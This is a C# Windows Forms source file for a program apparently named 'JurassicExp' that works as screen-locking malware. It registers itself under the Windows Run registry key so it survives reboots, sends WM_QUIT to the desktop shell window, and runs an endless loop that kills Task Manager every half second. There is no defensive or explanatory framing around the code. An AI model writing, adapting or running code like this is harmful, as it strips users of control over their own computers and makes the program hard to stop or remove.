using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace JurassicExp
{
    public partial class Form1 : Form
    {
        [DllImport("user32.dll")]
        public static extern int FindWindow(string lpClassName, string lpWindowName);
        [DllImport("user32.dll")]
        public static extern int SendMessage(int hWnd, uint Msg, int wParam, int lParam);

        [return: MarshalAs(UnmanagedType.Bool)]
        [DllImport("user32.dll", SetLastError = true)]
        public static extern bool PostMessage(int hWnd, uint Msg, int wParam, int lParam);

        Form2 frm;
        public Form1()
        {
            InitializeComponent();

            RegisterInStartup(true);
        }
        public void EndTask()
        {
            foreach (Process p in System.Diagnostics.Process.GetProcessesByName("taskmgr"))
            {
                try
                {
                    p.Kill();
                    p.WaitForExit(); // possibly with a timeout
                }
                catch(Exception e) {  }
            }
            
        }
        private void button1_Click(object sender, EventArgs e)
        {
            //string url1 = "";
            //System.Diagnostics.Process.Start(url1);
            //string url2 = "";
            //System.Diagnostics.Process.Start(url2);
            Application.Exit();
        }

        private void button2_Click(object sender, System.EventArgs e)
        {
            frm = new Form2();
            frm.Show();
            
        }
        
        

        private void Form1_Load(object sender, EventArgs e)
        {
            int hwnd;
            hwnd = FindWindow("Progman", null);
            PostMessage(hwnd, /*WM_QUIT*/ 0x12, 0, 0);

            System.Threading.Tasks.Task.Run(() =>
            {
                while (true)
                {
                    EndTask();
                    System.Threading.Thread.Sleep(500);
                }
            });
            
        }

        // This method adds the current executable to the startup directory of Windows OS.
        private void RegisterInStartup(bool isChecked)
        {
            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey
                    ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            if (isChecked)
            {
                registryKey.SetValue("JurassicTerm", Application.ExecutablePath);
            }
            else
            {
                registryKey.DeleteValue("JurassicTerm");
            }
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }
    }
}
